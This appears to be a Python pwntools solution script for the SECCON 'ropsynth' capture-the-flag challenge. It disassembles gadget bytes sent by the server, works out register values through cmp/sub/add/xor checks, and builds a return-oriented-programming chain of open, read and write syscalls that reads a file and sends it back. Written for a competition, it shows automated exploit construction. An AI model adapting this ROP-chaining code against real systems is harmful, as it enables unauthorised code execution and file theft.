from pwn import *
import binascii
import commands

GADGET_BASE = 0x00800000

def t64(x):
    return x % (1 << 64)

def parse_regs(regs):
    ops = list(reversed(regs["ops"]))
    value = None
    for op in ops:
        opr = int(op[1], 16)
        if op[0] == "cmp":
            value = opr
        elif op[0] == "sub":
            old = value
            value = t64(value + opr)
            #print("%08X %08X" % (old, value))
        elif op[0] == "add":
            old = value
            value = t64(value + ((1<<64) - opr))
            #print("%16X %16X %16X" % (old, opr, value))
        elif op[0] == "xor":
            value = t64(value ^ opr)
        else:
            raise
    return value

def parse_info(info):
    values = []
    for r in info["regs"]:
        r["val"] = (parse_regs(r))
    return info

def get_gadget(reg, val):
    p = parsed[reg].replace("A"*8, p64(val))
    #print(reg, repr(p), len(p))
    return p

def get_syscall():
    return parsed["syscall"].replace("A"*8, "")

def syscall(rax, rdi, rsi, rdx):
    return (get_gadget("rax", rax) +
        get_gadget("rdi", rdi) +
        get_gadget("rsi", rsi) +
        get_gadget("rdx", rdx) +
        get_syscall())

re = remote('ropsynth.pwn.seccon.jp', 10000)
for i in xrange(5):
    print(re.readline())
    l = re.readline()
    print(l)
    gadgets = binascii.a2b_base64(l)
    ropchain = ""

    with open("ropchain.bin", "wb") as f:
        f.write(gadgets)

    out = commands.getoutput("objdump -M intel -b binary -D -m i386:x86-64 ropchain.bin").splitlines()[7:]
    g = []
    m = {}
    for i, l in enumerate(out):
        idx, op, ass = l.split("\t")
        idx = int(idx.replace(":", ""), 16)
        #print(idx)
        ass = ass.split(" " )
        while '' in ass:
            ass.remove("")

        g.append((idx, ass))
        m[idx] = i

    starts = []
    for i in xrange(len(g)):
        idx, ass = g[i]
        if ass[0] == "pop":
            idx2, ass2 = g[i + 1]
            if ass2[0] == "pop":
                #print("FOUND GOOD: %s %s" % (ass, ass2))
                starts.append(i)
        if ass[0] == "syscall":
            starts.append(i)

    parsed = {}
    for s in starts:
        info = {}
        idx, ass = g[s]
        info["idx"] = idx
        if ass[0] == "syscall":
            info["target"] = "syscall"
        else:
            info["target"] = ass[1]
        info["regs"] = []

        i = s + 1
        #print(info)
        cur = None
        while True:
            idx , ass = g[i]
            if ass[0] == "pop":
                if cur is not None:
                    info["regs"].append(cur)
                cur = {}
                cur["reg"] = ass[1]
                cur["ops"] = []
            elif ass[0] == "je":
                i = m[int(ass[1], 16)] - 1
            elif ass[0] == "ret":
                break
            else:
                reg, val = ass[1].split(",")
                assert(cur["reg"] == reg)
                cur["ops"].append((ass[0], val))
            i +=1
        if cur is not None:
            info["regs"].append(cur)

        info = parse_info(info)
        payload = p64(GADGET_BASE + info["idx"])
        payload += "A"*8
        for r in info["regs"]:
            payload += p64(r["val"])
        #print(repr(payload), len(payload))
        parsed[info["target"]] = payload

    if i == 1:
        fd = 2
    else:
        fd = 1
    #print(repr(syscall(0x41414141, 0x42424242, 0x43434343, 0x444444444)))
    payload = syscall(2, 0x00a00000, 0, 0) + syscall(0, 3, 0x00a00800, 64) + syscall(1, fd, 0x00a00800, 64) + syscall(3, 3, 0, 0)
    print(repr(payload))
    payload = binascii.b2a_base64(payload)
    print(repr(payload))
    if i == 1:
        re.send("A"*20000+"\n")
    else:
        re.send(payload)
    print("RESULT: %s" % re.readline())
    #re.interactive()
    #print(repr(r.readline()))

    data = ""
    with open("ropchain.bin", "rb") as f:
        data += f.read()
    data = data.ljust(4096, "\xcc")
    data += payload
    data = data.ljust(4096 * 2, "\xff")
    with open("g", "wb") as f:
        f.write(data)

re.interactive()
